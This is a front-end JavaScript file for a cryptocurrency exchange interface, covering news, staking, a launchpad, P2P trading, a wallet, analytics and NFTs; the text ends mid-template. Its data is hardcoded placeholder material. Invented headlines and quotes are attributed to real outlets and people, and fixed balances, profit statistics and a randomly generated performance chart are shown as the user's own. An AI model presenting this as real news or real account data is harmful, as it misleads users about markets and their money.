// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// NEWS LAYER DATA & FUNCTIONS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const NEWS_POOL=[
  {tag:'btc',tagLabel:'Bitcoin',emoji:'â‚¿',tagCls:'news-tag-btc',title:'Bitcoin Breaks Key Resistance â€” Analysts Target $75K',body:'On-chain data shows record institutional inflows as BTC consolidates above $67K. Whale wallets accumulated 42,000 BTC this week alone.',time:'2 min ago',source:'CryptoInsider',hot:true},
  {tag:'eth',tagLabel:'Ethereum',emoji:'Îž',tagCls:'news-tag-eth',title:'Ethereum Layer-2 Volume Hits All-Time High of $48B',body:'Arbitrum and Optimism combined process more transactions than Ethereum mainnet for the first time, signaling mass L2 adoption.',time:'15 min ago',source:'DeFiPulse',hot:true},
  {tag:'defi',tagLabel:'DeFi',emoji:'ðŸ”—',tagCls:'news-tag-defi',title:'DeFi Total Value Locked Surpasses $100B Milestone',body:'The decentralized finance ecosystem reaches a historic milestone as yield farming and liquid staking drive fresh capital inflows.',time:'32 min ago',source:'TheBlock'},
  {tag:'reg',tagLabel:'Regulation',emoji:'âš–ï¸',tagCls:'news-tag-reg',title:'SEC Approves Three New Spot Bitcoin ETF Applications',body:'The landmark decision opens the floodgates for traditional investors, with analysts projecting $50B in inflows within 12 months.',time:'1 hr ago',source:'Reuters'},
  {tag:'btc',tagLabel:'Bitcoin',emoji:'â‚¿',tagCls:'news-tag-btc',title:'MicroStrategy Buys Additional 12,000 BTC Worth $820M',body:'Michael Saylor confirms the purchase, bringing MicroStrategy total holdings to over 200,000 BTC, the largest corporate treasury.',time:'2 hr ago',source:'Bloomberg'},
  {tag:'macro',tagLabel:'Macro',emoji:'ðŸ“Š',tagCls:'news-tag-macro',title:'Fed Signals Rate Cuts â€” Crypto Markets Rally 8%',body:'Federal Reserve minutes indicate three rate cuts expected this year, triggering a broad risk-on rally across crypto, stocks, and gold.',time:'3 hr ago',source:'FT'},
  {tag:'nft',tagLabel:'NFT',emoji:'ðŸ–¼ï¸',tagCls:'news-tag-nft',title:'CryptoPunks Floor Price Doubles in 48 Hours',body:'A surge in blue-chip NFT demand pushes CryptoPunks floor to 68 ETH as collectors return to the market following months of low activity.',time:'4 hr ago',source:'NFTevening'},
  {tag:'eth',tagLabel:'Ethereum',emoji:'Îž',tagCls:'news-tag-eth',title:'Vitalik Buterin Proposes EIP-7702 Account Abstraction',body:'The new proposal would allow regular wallets to behave like smart contracts, dramatically improving the user experience for all ETH users.',time:'5 hr ago',source:'Ethereum.org'},
  {tag:'defi',tagLabel:'DeFi',emoji:'ðŸ”—',tagCls:'news-tag-defi',title:'Uniswap V4 Launches With Revolutionary Hook System',body:'The new AMM architecture allows custom logic to be added to liquidity pools, enabling dynamic fees, TWAP orders, and more.',time:'6 hr ago',source:'Decrypt'},
  {tag:'macro',tagLabel:'Macro',emoji:'ðŸ“Š',tagCls:'news-tag-macro',title:'BlackRock CEO: Bitcoin is Digital Gold, Not a Currency',body:'Larry Fink reverses his previous skepticism, calling Bitcoin a legitimate store of value asset class after managing $20B in BTC ETFs.',time:'8 hr ago',source:'CNBC'},
  {tag:'reg',tagLabel:'Regulation',emoji:'âš–ï¸',tagCls:'news-tag-reg',title:'EU MiCA Framework Goes Live â€” Exchanges Rush to Comply',body:'Markets in Crypto Assets regulation officially takes effect across 27 EU member states, setting the global standard for crypto oversight.',time:'10 hr ago',source:'CoinDesk'},
  {tag:'btc',tagLabel:'Bitcoin',emoji:'â‚¿',tagCls:'news-tag-btc',title:'Lightning Network Capacity Hits Record 6,000 BTC',body:'Bitcoin payment channels grow 34% this quarter as merchants and apps increasingly adopt instant low-fee Bitcoin micropayments.',time:'12 hr ago',source:'BitcoinMagazine'},
];

let currentNewsFilter='all';
function buildNews(){
  const grid=$('newsGrid');if(!grid)return;
  const filtered=currentNewsFilter==='all'?NEWS_POOL:NEWS_POOL.filter(n=>n.tag===currentNewsFilter);
  grid.innerHTML=filtered.map(n=>`
    <div class="news-card" onclick="showToast('ðŸ“° Opening: ${n.title.substring(0,40)}...','blue')">
      <div class="news-img" style="background:linear-gradient(135deg,var(--bg2),var(--bg3))">${n.emoji}</div>
      <div style="padding:14px">
        <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px">
          <span class="news-tag ${n.tagCls}">${n.tagLabel}</span>
          ${n.hot?'<span class="news-tag" style="background:rgba(255,61,87,.15);color:var(--red)">ðŸ”¥ HOT</span>':''}
          <span style="font-size:10px;color:var(--text3);margin-left:auto">${n.time}</span>
        </div>
        <div style="font-family:var(--font-display);font-size:14px;font-weight:700;margin-bottom:6px;line-height:1.4">${n.title}</div>
        <div style="font-size:12px;color:var(--text2);line-height:1.55;margin-bottom:10px">${n.body}</div>
        <div style="font-size:11px;color:var(--text3)">Source: <strong style="color:var(--text2)">${n.source}</strong></div>
      </div>
    </div>`).join('');
}
function filterNews(tag,el){
  currentNewsFilter=tag;
  document.querySelectorAll('#newsFilterBtns .scanner-filter').forEach(b=>b.classList.remove('active'));
  el.classList.add('active');
  buildNews();
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// STAKING FUNCTIONS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const STAKE_PRODUCTS=[
  {coin:'BTC',name:'Bitcoin Fixed',apy:4.2,apyCls:'apy-stable',lock:'90 days',min:0.001,max:5,filled:78,total:1000,icon:'â‚¿',color:'#F7931A',type:'fixed',featured:false},
  {coin:'ETH',name:'Ethereum Flexible',apy:5.8,apyCls:'apy-flex',lock:'None',min:0.01,max:100,filled:45,total:5000,icon:'Îž',color:'#627EEA',type:'flexible',featured:false},
  {coin:'SOL',name:'Solana Hot Stake',apy:12.4,apyCls:'apy-hot',lock:'30 days',min:0.1,max:1000,filled:92,total:200000,icon:'â—Ž',color:'#00FFA3',type:'fixed',featured:true},
  {coin:'BNB',name:'BNB Vault',apy:8.6,apyCls:'apy-stable',lock:'60 days',min:0.01,max:500,filled:61,total:10000,icon:'B',color:'#F3BA2F',type:'fixed',featured:false},
  {coin:'USDT',name:'USDT Stable Earn',apy:9.2,apyCls:'apy-hot',lock:'None',min:10,max:100000,filled:34,total:10000000,icon:'â‚®',color:'#26A17B',type:'flexible',featured:true},
  {coin:'XRP',name:'XRP Liquid Stake',apy:6.4,apyCls:'apy-flex',lock:'14 days',min:10,max:50000,filled:55,total:500000,icon:'âœ•',color:'#00AAE4',type:'flexible',featured:false},
  {coin:'ADA',name:'Cardano Pool',apy:5.1,apyCls:'apy-stable',lock:'None',min:10,max:100000,filled:42,total:1000000,icon:'â‚³',color:'#0033AD',type:'flexible',featured:false},
  {coin:'AVAX',name:'Avalanche Boost',apy:14.8,apyCls:'apy-hot',lock:'60 days',min:0.1,max:5000,filled:88,total:50000,icon:'A',color:'#E84142',type:'fixed',featured:true},
];
const userStakes={};
function buildStaking(){
  const grid=$('stakingGrid');if(!grid)return;
  let totalEarning=0;
  Object.values(userStakes).forEach(s=>totalEarning+=s.dailyEarn);
  const te=$('totalStakeEarning');if(te)te.textContent='+$'+formatNum(totalEarning,4)+'/day';
  grid.innerHTML=STAKE_PRODUCTS.map(p=>{
    const staked=userStakes[p.coin];
    return `<div class="stake-card ${p.featured?'featured':''}">
      ${p.featured?'<div style="position:absolute;top:12px;right:12px;font-size:10px;font-weight:800;color:var(--yellow);font-family:var(--font-mono)">â­ FEATURED</div>':''}
      <div style="display:flex;align-items:center;gap:12px;margin-bottom:14px">
        <div style="width:44px;height:44px;border-radius:50%;background:${p.color}22;border:2px solid ${p.color}44;display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:900;color:${p.color};flex-shrink:0">${p.icon}</div>
        <div style="flex:1">
          <div style="font-family:var(--font-display);font-size:15px;font-weight:800">${p.name}</div>
          <div style="font-size:11px;color:var(--text3)">Lock: ${p.lock} Â· Min: ${p.min} ${p.coin}</div>
        </div>
        <div class="apy-badge ${p.apyCls}">${p.apy}% APY</div>
      </div>
      <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:12px">
        <div style="background:var(--bg2);border-radius:var(--r-md);padding:8px;text-align:center">
          <div style="font-family:var(--font-mono);font-size:13px;font-weight:700;color:var(--green)">${p.apy}%</div>
          <div style="font-size:9px;color:var(--text3);margin-top:2px">APY</div>
        </div>
        <div style="background:var(--bg2);border-radius:var(--r-md);padding:8px;text-align:center">
          <div style="font-family:var(--font-mono);font-size:13px;font-weight:700">${p.lock}</div>
          <div style="font-size:9px;color:var(--text3);margin-top:2px">Lock Period</div>
        </div>
        <div style="background:var(--bg2);border-radius:var(--r-md);padding:8px;text-align:center">
          <div style="font-family:var(--font-mono);font-size:13px;font-weight:700;color:var(--cyan)">${p.filled}%</div>
          <div style="font-size:9px;color:var(--text3);margin-top:2px">Filled</div>
        </div>
      </div>
      <div style="font-size:11px;color:var(--text3);margin-bottom:4px;display:flex;justify-content:space-between"><span>Pool capacity</span><span>${p.filled}% / 100%</span></div>
      <div class="stake-progress"><div class="stake-fill" style="width:${p.filled}%"></div></div>
      ${staked?`<div style="background:var(--green3);border:1px solid rgba(0,230,118,.2);border-radius:var(--r-md);padding:8px 12px;margin-bottom:8px;font-size:12px;display:flex;justify-content:space-between"><span style="color:var(--text2)">Your stake:</span><span style="color:var(--green);font-weight:700;font-family:var(--font-mono)">${staked.amount} ${p.coin} Â· +$${formatNum(staked.dailyEarn,4)}/day</span></div>`:''}
      <button style="width:100%;padding:10px;border:none;border-radius:var(--r-md);font-size:13px;font-weight:700;cursor:pointer;transition:all .2s;font-family:var(--font-mono);background:${staked?'var(--red2)':'var(--green)'};color:${staked?'var(--red)':'#000'};border:${staked?'1px solid rgba(255,61,87,.3)':'none'}" onclick="handleStake('${p.coin}','${p.name}',${p.apy},this)">
        ${staked?'â¹ Unstake':'+ Stake '+p.coin}
      </button>
    </div>`;
  }).join('');
}
function handleStake(coin,name,apy,btn){
  if(!STATE.loggedIn){showLayer('loginLayer');return;}
  if(userStakes[coin]){
    const s=userStakes[coin];
    STATE.user.balance+=s.amount*STATE.prices[coin+'/USDT']||s.amount;
    delete userStakes[coin];
    buildStaking();
    showToast(`âœ… Unstaked ${s.amount} ${coin} successfully!`,'green');
    return;
  }
  const amt=parseFloat(prompt(`Enter amount of ${coin} to stake (min: 0.001):`)||0);
  if(!amt||amt<=0){return;}
  const price=STATE.prices[coin+'/USDT']||1;
  const dailyEarn=(amt*price*apy/100)/365;
  userStakes[coin]={amount:amt,apy,dailyEarn,stakedAt:new Date().toISOString()};
  buildStaking();
  showToast(`ðŸ’Ž Staked ${amt} ${coin}!\nEarning ${formatNum(dailyEarn,4)} USDT/day at ${apy}% APY`,'green',5000);
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// LAUNCHPAD FUNCTIONS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const LAUNCHPAD_PROJECTS=[
  {name:'NexaChain',sym:'NEXA',desc:'Next-gen L1 blockchain with 100K TPS and EVM compatibility. Backed by Multicoin Capital.',icon:'âš¡',status:'live',statusCls:'lps-live',raise:2000000,raised:1640000,price:0.08,ath:0.84,listing:'Jan 30',participants:8420,minBNB:0.1,bg:'linear-gradient(135deg,rgba(0,230,118,.08),rgba(0,229,255,.04))'},
  {name:'DefiVault Pro',sym:'DVP',desc:'Automated yield optimizer across 40+ protocols. Audit by CertiK. TVL target $500M.',icon:'ðŸ¦',status:'live',statusCls:'lps-live',raise:1500000,raised:980000,price:0.12,ath:null,listing:'Feb 5',participants:5210,minBNB:0.05,bg:'linear-gradient(135deg,rgba(68,138,255,.08),rgba(170,119,255,.04))'},
  {name:'MetaRealm',sym:'MREALM',desc:'Play-to-earn metaverse with real estate NFTs. 2M registered players in beta.',icon:'ðŸŒ',status:'upcoming',statusCls:'lps-upcoming',raise:3000000,raised:0,price:0.05,ath:null,listing:'Feb 15',participants:0,minBNB:0.2,bg:'linear-gradient(135deg,rgba(170,119,255,.08),rgba(255,61,87,.04))'},
  {name:'OmniDEX',sym:'OMNI',desc:'Cross-chain DEX aggregator supporting 18 blockchains. Zero slippage routing.',icon:'ðŸ”„',status:'upcoming',statusCls:'lps-upcoming',raise:2500000,raised:0,price:0.18,ath:null,listing:'Mar 1',participants:0,minBNB:0.1,bg:'linear-gradient(135deg,rgba(0,229,255,.08),rgba(68,138,255,.04))'},
  {name:'ZeroKnow',sym:'ZKW',desc:'ZK-rollup privacy layer for Ethereum. MIT research team. $8M seed round closed.',icon:'ðŸ”’',status:'ended',statusCls:'lps-ended',raise:1000000,raised:1000000,price:0.04,ath:2.84,listing:'Listed',participants:12840,minBNB:0.05,bg:'var(--bg1)'},
];
function buildLaunchpad(){
  const grid=$('launchpadGrid');if(!grid)return;
  grid.innerHTML=LAUNCHPAD_PROJECTS.map(p=>{
    const pct=p.raise>0?Math.min((p.raised/p.raise)*100,100):0;
    return `<div class="lp-card ${p.status}" style="background:${p.bg}">
      <div style="display:flex;align-items:flex-start;gap:14px;margin-bottom:14px">
        <div style="width:52px;height:52px;background:var(--bg2);border:1px solid var(--border2);border-radius:var(--r-lg);display:flex;align-items:center;justify-content:center;font-size:24px;flex-shrink:0">${p.icon}</div>
        <div style="flex:1">
          <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:4px">
            <span style="font-family:var(--font-display);font-size:16px;font-weight:800">${p.name}</span>
            <span style="font-family:var(--font-mono);font-size:11px;color:var(--text3)">${p.sym}</span>
          </div>
          <span class="lp-status ${p.statusCls}">${p.status==='live'?'â— LIVE':p.status==='upcoming'?'â³ UPCOMING':'âœ“ ENDED'}</span>
        </div>
      </div>
      <div style="font-size:12px;color:var(--text2);line-height:1.55;margin-bottom:14px">${p.desc}</div>
      <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:6px;margin-bottom:12px">
        <div style="background:var(--bg2);border-radius:var(--r-md);padding:8px;text-align:center">
          <div style="font-family:var(--font-mono);font-size:12px;font-weight:800;color:var(--green)">$${p.price}</div>
          <div style="font-size:9px;color:var(--text3);margin-top:2px">Token Price</div>
        </div>
        <div style="background:var(--bg2);border-radius:var(--r-md);padding:8px;text-align:center">
          <div style="font-family:var(--font-mono);font-size:12px;font-weight:800">${p.participants.toLocaleString()}</div>
          <div style="font-size:9px;color:var(--text3);margin-top:2px">Participants</div>
        </div>
        <div style="background:var(--bg2);border-radius:var(--r-md);padding:8px;text-align:center">
          <div style="font-family:var(--font-mono);font-size:12px;font-weight:800;color:${p.ath?'var(--yellow)':'var(--text3)'}">${p.ath?'x'+formatNum(p.ath/p.price,1):'TBA'}</div>
          <div style="font-size:9px;color:var(--text3);margin-top:2px">ATH ROI</div>
        </div>
      </div>
      ${p.status!=='upcoming'?`
      <div style="font-size:11px;color:var(--text3);margin-bottom:4px;display:flex;justify-content:space-between">
        <span>Raised: $${formatNum(p.raised,0)}</span><span>Target: $${formatNum(p.raise,0)}</span>
      </div>
      <div class="lp-progress"><div class="lp-fill" style="width:${pct}%"></div></div>
      <div style="font-size:10px;color:var(--text3);margin-bottom:10px">${pct.toFixed(1)}% filled Â· Listing: ${p.listing}</div>`:'<div style="font-size:11px;color:var(--blue);margin-bottom:10px">ðŸ“… Opens ${p.listing} Â· Min: ${p.minBNB} BNB</div>'}
      <button style="width:100%;padding:10px;border:none;border-radius:var(--r-md);font-size:13px;font-weight:700;cursor:pointer;font-family:var(--font-mono);transition:all .2s;background:${p.status==='live'?'var(--green)':p.status==='upcoming'?'rgba(68,138,255,.15)':'var(--bg3)'};color:${p.status==='live'?'#000':p.status==='upcoming'?'var(--blue)':'var(--text3)'};border:${p.status==='upcoming'?'1px solid rgba(68,138,255,.3)':'none'}" onclick="handleLaunchpad('${p.sym}','${p.status}')">
        ${p.status==='live'?'ðŸš€ Participate Now':p.status==='upcoming'?'ðŸ”” Set Reminder':'âœ“ Sale Ended'}
      </button>
    </div>`;
  }).join('');
}
function handleLaunchpad(sym,status){
  if(!STATE.loggedIn){showLayer('loginLayer');return;}
  if(status==='live') showToast(`ðŸš€ Joining ${sym} IDO! Complete KYC first to participate.`,'green',5000);
  else if(status==='upcoming') showToast(`ðŸ”” Reminder set for ${sym} launch!`,'blue');
  else showToast(`${sym} sale has ended. Check listings tab.`,'yellow');
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// P2P TRADING FUNCTIONS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const P2P_METHODS=['M-Pesa','Bank Transfer','PayPal','Wise','Cash App','Revolut','Skrill','Venmo'];
const P2P_ADS_BUY=[
  {trader:'CryptoMerchant',rating:4.9,orders:2840,coin:'USDT',price:1.02,min:50,max:5000,methods:['M-Pesa','Bank Transfer'],completion:99.2,online:true},
  {trader:'FastTrader_KE',rating:4.8,orders:1240,coin:'USDT',price:1.01,min:20,max:2000,methods:['M-Pesa'],completion:98.8,online:true},
  {trader:'GlobalFX',rating:4.7,orders:4200,coin:'BTC',price:67800,min:100,max:10000,methods:['Bank Transfer','Wise'],completion:99.5,online:false},
  {trader:'QuickSwap',rating:4.9,orders:890,coin:'ETH',price:3560,min:50,max:5000,methods:['PayPal','Revolut'],completion:97.4,online:true},
  {trader:'StablePro',rating:5.0,orders:6200,coin:'USDT',price:1.00,min:100,max:20000,methods:['Bank Transfer'],completion:99.9,online:true},
];
let p2pTab='buy';
function buildP2P(){
  const list=$('p2pAdsList');if(!list)return;
  list.innerHTML=P2P_ADS_BUY.map(ad=>`
    <div class="p2p-ad" onclick="handleP2PTrade('${ad.trader}','${ad.coin}',${ad.price})">
      <div style="display:flex;align-items:flex-start;gap:12px;flex-wrap:wrap">
        <div style="flex:1;min-width:200px">
          <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px">
            <div style="width:32px;height:32px;border-radius:50%;background:linear-gradient(135deg,var(--green),var(--cyan));display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:800;color:#000">${ad.trader.charAt(0)}</div>
            <div>
              <div style="font-weight:700;font-size:13px">${ad.trader} ${ad.online?'<span style="color:var(--green);font-size:10px">â— Online</span>':'<span style="color:var(--text3);font-size:10px">â—‹ Offline</span>'}</div>
              <div style="font-size:11px;color:var(--text3)">â­ ${ad.rating} Â· ${ad.orders.toLocaleString()} orders Â· ${ad.completion}% completion</div>
            </div>
          </div>
          <div style="display:flex;gap:4px;flex-wrap:wrap;margin-top:6px">
            ${ad.methods.map(m=>`<span class="p2p-method">${m}</span>`).join('')}
          </div>
        </div>
        <div style="text-align:right;flex-shrink:0">
          <div style="font-family:var(--font-mono);font-size:16px;font-weight:800;color:${p2pTab==='buy'?'var(--green)':'var(--red)'}">$${formatNum(ad.price,2)}</div>
          <div style="font-size:11px;color:var(--text3);margin-top:2px">Limit: $${ad.min} â€” $${formatNum(ad.max,0)}</div>
          <button style="margin-top:8px;padding:7px 20px;background:${p2pTab==='buy'?'var(--green)':'var(--red)'};color:${p2pTab==='buy'?'#000':'#fff'};border:none;border-radius:var(--r-md);font-size:12px;font-weight:700;cursor:pointer;font-family:var(--font-mono)" onclick="event.stopPropagation();handleP2PTrade('${ad.trader}','${ad.coin}',${ad.price})">${p2pTab==='buy'?'Buy':'Sell'} ${ad.coin}</button>
        </div>
      </div>
    </div>`).join('');
}
function setP2PTab(tab,el){
  p2pTab=tab;
  document.querySelectorAll('.p2p-tab-btn').forEach(b=>b.classList.remove('active'));
  el.classList.add('active');
  buildP2P();
}
function handleP2PTrade(trader,coin,price){
  if(!STATE.loggedIn){showLayer('loginLayer');return;}
  showToast(`ðŸ¤ Opening trade with ${trader}\n${coin} @ $${formatNum(price,2)}\nChat window opening...`,'blue',5000);
}
function filterP2P(){buildP2P();}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// WALLET FUNCTIONS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const WALLET_ASSETS=[
  {coin:'BTC',name:'Bitcoin',icon:'â‚¿',color:'#F7931A',balance:0.0842,frozen:0},
  {coin:'ETH',name:'Ethereum',icon:'Îž',color:'#627EEA',balance:1.284,frozen:0},
  {coin:'USDT',name:'Tether',icon:'â‚®',color:'#26A17B',balance:4280.50,frozen:0},
  {coin:'SOL',name:'Solana',icon:'â—Ž',color:'#00FFA3',balance:12.4,frozen:0},
  {coin:'BNB',name:'BNB',icon:'B',color:'#F3BA2F',balance:3.2,frozen:0},
  {coin:'XRP',name:'Ripple',icon:'âœ•',color:'#00AAE4',balance:840,frozen:0},
  {coin:'ADA',name:'Cardano',icon:'â‚³',color:'#0033AD',balance:2400,frozen:0},
  {coin:'DOGE',name:'Dogecoin',icon:'Ã',color:'#C2A633',balance:12000,frozen:0},
];
function buildWallet(){
  const list=$('walletAssetList');if(!list)return;
  let totalUSD=0;
  WALLET_ASSETS.forEach(a=>{
    const price=STATE.prices[a.coin+'/USDT']||1;
    totalUSD+=a.balance*price;
  });
  const wt=$('walletTotalUSD');if(wt)wt.textContent=formatUSD(totalUSD);
  list.innerHTML=WALLET_ASSETS.map(a=>{
    const price=STATE.prices[a.coin+'/USDT']||1;
    const usd=a.balance*price;
    const chg=parseFloat(STATE.changes[a.coin+'/USDT']||0);
    return `<div class="wallet-asset-row">
      <div class="wallet-coin-icon" style="background:${a.color}22;border:1px solid ${a.color}44;color:${a.color};font-weight:900;font-size:16px">${a.icon}</div>
      <div style="flex:1;min-width:0">
        <div style="font-weight:700;font-size:13px">${a.name} <span style="font-size:11px;color:var(--text3);font-weight:400">${a.coin}</span></div>
        <div style="font-size:11px;color:var(--text3);margin-top:1px">${a.balance} ${a.coin} ${a.frozen>0?`Â· <span style="color:var(--yellow)">Frozen: ${a.frozen}</span>`:''}</div>
      </div>
      <div style="text-align:right;margin-right:12px">
        <div style="font-family:var(--font-mono);font-size:13px;font-weight:700">${formatUSD(usd)}</div>
        <div style="font-size:11px;font-weight:700;font-family:var(--font-mono);color:${chg>=0?'var(--green)':'var(--red)'}">${formatPct(chg)}</div>
      </div>
      <div style="display:flex;gap:4px;flex-shrink:0">
        <button class="wallet-action-btn wab-deposit" onclick="showLayer('depositLayer')">Deposit</button>
        <button class="wallet-action-btn wab-withdraw" onclick="showWithdrawModal()">Withdraw</button>
        <button class="wallet-action-btn wab-convert" onclick="showConvertModal('${a.coin}')">Convert</button>
      </div>
    </div>`;
  }).join('');
}
function showConvertModal(coin){
  if(!STATE.loggedIn){showLayer('loginLayer');return;}
  showToast(`ðŸ”„ Convert ${coin} â€” select target asset in the trading panel`,'blue');
  showLayer('tradingLayer');
}
setInterval(()=>{if($('walletAssetList'))buildWallet();},5000);

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// PORTFOLIO ANALYTICS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function buildAnalytics(){
  const perfEl=$('analyticsPerf');
  if(perfEl){
    const canvas=document.createElement('canvas');
    canvas.id='analyticsChart';
    perfEl.innerHTML='';
    perfEl.appendChild(canvas);
    drawAnalyticsChart(canvas);
  }
  buildAnalyticsStats();
}
function drawAnalyticsChart(canvas){
  if(!canvas)return;
  const ctx=canvas.getContext('2d');
  const W=canvas.offsetWidth||600,H=canvas.offsetHeight||220;
  canvas.width=W;canvas.height=H;
  const pts=[];let v=10000;
  for(let i=0;i<60;i++){v+=rand(-300,600);pts.push(v);}
  const mn=Math.min(...pts)-500,mx=Math.max(...pts)+500;
  const sx=W/(pts.length-1);
  const sy=n=>H-((n-mn)/(mx-mn))*(H-30)-15;
  const grad=ctx.createLinearGradient(0,0,0,H);
  grad.addColorStop(0,'rgba(0,230,118,0.25)');
  grad.addColorStop(1,'rgba(0,230,118,0)');
  ctx.beginPath();ctx.moveTo(0,sy(pts[0]));
  pts.forEach((p,i)=>{
    if(i>0){
      const cpx=(i-.5)*sx;
      ctx.quadraticCurveTo(cpx,sy(pts[i-1]),i*sx,sy(p));
    }
  });
  ctx.lineTo(W,H);ctx.lineTo(0,H);ctx.closePath();
  ctx.fillStyle=grad;ctx.fill();
  ctx.beginPath();ctx.moveTo(0,sy(pts[0]));
  pts.forEach((p,i)=>{
    if(i>0){const cpx=(i-.5)*sx;ctx.quadraticCurveTo(cpx,sy(pts[i-1]),i*sx,sy(p));}
  });
  ctx.strokeStyle='#00E676';ctx.lineWidth=2.5;ctx.stroke();
}
function buildAnalyticsStats(){
  const grid=$('analyticsStatsGrid');if(!grid)return;
  const stats=[
    {val:'+$3,284',lbl:'Total Profit',color:'var(--green)'},
    {val:'+24.8%',lbl:'Total Return',color:'var(--green)'},
    {val:'73.2%',lbl:'Win Rate',color:'var(--cyan)'},
    {val:'2.4:1',lbl:'Avg Risk/Reward',color:'var(--yellow)'},
    {val:'284',lbl:'Total Trades',color:'var(--text1)'},
    {val:'$46.20',lbl:'Avg Trade Size',color:'var(--text1)'},
    {val:'-8.4%',lbl:'Max Drawdown',color:'var(--red)'},
    {val:'4.2h',lbl:'Avg Hold Time',color:'var(--purple)'},
  ];
  grid.innerHTML=stats.map(s=>`
    <div class="analytics-stat">
      <span class="as-val" style="color:${s.color}">${s.val}</span>
      <span class="as-lbl">${s.lbl}</span>
    </div>`).join('');
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// NFT MARKETPLACE
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const NFT_COLLECTIONS=[
  {name:'CryptoPunks #4821',collection:'CryptoPunks',emoji:'ðŸ‘¾',price:68.4,floor:64.2,change:+8.2,rarity:'Legendary',bg:'linear-gradient(135deg,#1a1a2e,#16213e)',badge:'ðŸ”¥ Hot'},
  {name:'Bored Ape #9201',collection:'BAYC',emoji:'ðŸ¦',price:42.8,floor:38.5,change:+4.1,rarity:'Rare',bg:'linear-gradient(135deg,#0f3460,#533483)',badge:''},
  {name:'Azuki #1204',collection:'Azuki',emoji:'ðŸŒ¸',price:18.4,floor:17.2,change:+2.4,rarity:'Uncommon',bg:'linear-gradient(135deg,#ff6b6b,#feca57)',badge:'ðŸ“ˆ Rising'},
  {name:'Doodle #8842',collection:'Doodles',emoji:'ðŸŽ¨',price:8.2,floor:7.8,change:-1.2,rarity:'Common',bg:'linear-gradient(135deg,#a8edea,#fed6e3)',badge:''},
  {name:'CloneX #2241',collection:'CloneX',emoji:'ðŸ¤–',price:12.4,floor:11.8,change:+6.8,rarity:'Rare',bg:'linear-gradient(135deg,#667eea,#764ba2)',badge:'âš¡ Trending'},
  {name:'Moonbird #4401',collection:'Moonbirds',emoji:'ðŸ¦‰',price:6.8,floor:6.4,change:-0.8,rarity:'Common',bg:'linear-gradient(135deg,#f093fb,#f5576c)',badge:''},
];
function buildNFT(){
  const grid=$('nftGrid');if(!grid)return;
  grid.innerHTML=NFT_COLLECTIONS.map(n=>`
    <div class="nft-card" onclick="showToast('ðŸ–¼ï¸ Opening ${n.name} â€” connecting to marketplace...','blue',4000)">
      <div class="nft-img" style="background:${n.bg}">
        ${n.emoji}
        ${n.badge?`<div class="nft-badge" style="background:rgba(0,0,0,.6);color:#fff">${n.badge}</div>`:''}
      </div>
      <div style="padding:14px">
        <div style="font-size:10px;color:var(--text3);margin-bottom:3px">${n.collection}</div>
        <div style="font-family:var(--font-display);font-size:14px;font-weight:800;margin-bottom:8px">${n.name}</div>
        <div style="display:flex;justify-content:space-between;align-items:flex-end">
          <div>
